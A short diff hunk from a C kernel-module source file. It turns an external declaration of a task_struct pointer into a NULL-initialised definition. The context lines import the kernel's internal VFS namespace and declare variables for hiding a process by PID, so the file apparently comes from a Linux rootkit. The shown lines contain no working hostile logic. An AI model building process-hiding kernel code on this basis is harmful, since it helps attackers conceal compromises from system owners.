@@ -16,7 +16,7 @@
 MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
 #endif
 
-extern struct task_struct *task;
+struct task_struct *task = NULL;
 struct task_struct *hide_pid_process_task;
 int hide_process_pid = 0;
 int hide_process_state = 0;
